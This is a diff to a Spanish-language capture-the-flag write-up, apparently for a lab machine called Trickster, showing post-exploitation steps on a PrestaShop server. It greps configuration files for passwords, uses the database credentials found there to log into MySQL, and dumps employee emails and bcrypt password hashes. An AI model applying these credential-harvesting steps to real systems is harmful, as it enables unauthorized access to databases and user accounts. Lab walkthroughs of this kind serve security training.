@@ -47,7 +47,10 @@ Y hacemos un tratamiento de la TTY para que podamos trabajar mas cómodamente
 
 En nuestro directorio acctual encontramos el directoriuo de `prestashop` buscamos por archivos de configuracion `find . -name \*conf\*` y encontramos la siguiente ruta `app/config`  buscamos por archivos que contengan la plabra password `grep -r -i "password"`y encontramos un archivo llamdo `parameters.php`
 
-Y encontramos el usuario de la base de datos `ps_user::prest@shop_o`
+Y encontramos el usuario de la base de datos 
+```ad-hint 
+ps_user::prest@shop_o
+```
 
 Nos conectamos a la base de datos con el usuario y password encontrados:
 `mysql -ups_user -pprest@shop_o -D prestashop`
@@ -58,6 +61,20 @@ Al haber muchas tablas se puede filtrar de la siguiente forma
 Lo que nos hace es: d3e la base de datos actual de todas las tablas muéstrame todas las columnas que contengan la palabra email
 
 Encontramos que en la tabla de empledos es donde se encuentran todos los datos mas relevantes;
+`describe ps_employee;`
+
+Obtenemos los usuarios y las contraseñas:
+`select email,passwd from ps_employee;`
+
+```ad-hint
+admin@trickster.htb
+
+$2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
+
+james@trickster.htb
+
+$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
+```
 
 
 
